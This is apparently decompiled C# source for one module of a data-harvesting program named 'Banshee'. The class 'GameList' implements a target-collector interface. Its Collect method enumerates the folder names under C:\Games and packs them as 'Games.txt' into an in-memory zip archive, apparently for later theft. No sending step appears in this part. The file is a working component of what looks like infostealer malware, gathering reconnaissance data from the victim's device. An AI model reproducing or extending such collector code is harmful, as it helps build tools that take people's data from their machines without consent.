﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using Banshee.Helper.Data;

namespace Banshee.Targets.Device
{
	// Token: 0x0200004F RID: 79
	public class GameList : ITarget
	{
		// Token: 0x060000B6 RID: 182 RVA: 0x000065DC File Offset: 0x000065DC
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string path = "C:\\Games";
			if (Directory.Exists(path))
			{
				IEnumerable<string> directories = Directory.GetDirectories(path);
				Func<string, string> selector;
				if ((selector = GameList.<>O.<0>__GetFileName) == null)
				{
					selector = (GameList.<>O.<0>__GetFileName = new Func<string, string>(Path.GetFileName));
				}
				List<string> list = directories.Select(selector).ToList<string>();
				if (list.Any<string>())
				{
					zip.AddTextFile("Games.txt", string.Join("\n", list));
				}
			}
		}

		// Token: 0x02000050 RID: 80
		[CompilerGenerated]
		private static class <>O
		{
			// Token: 0x04000096 RID: 150
			public static Func<string, string> <0>__GetFileName;
		}
	}
}
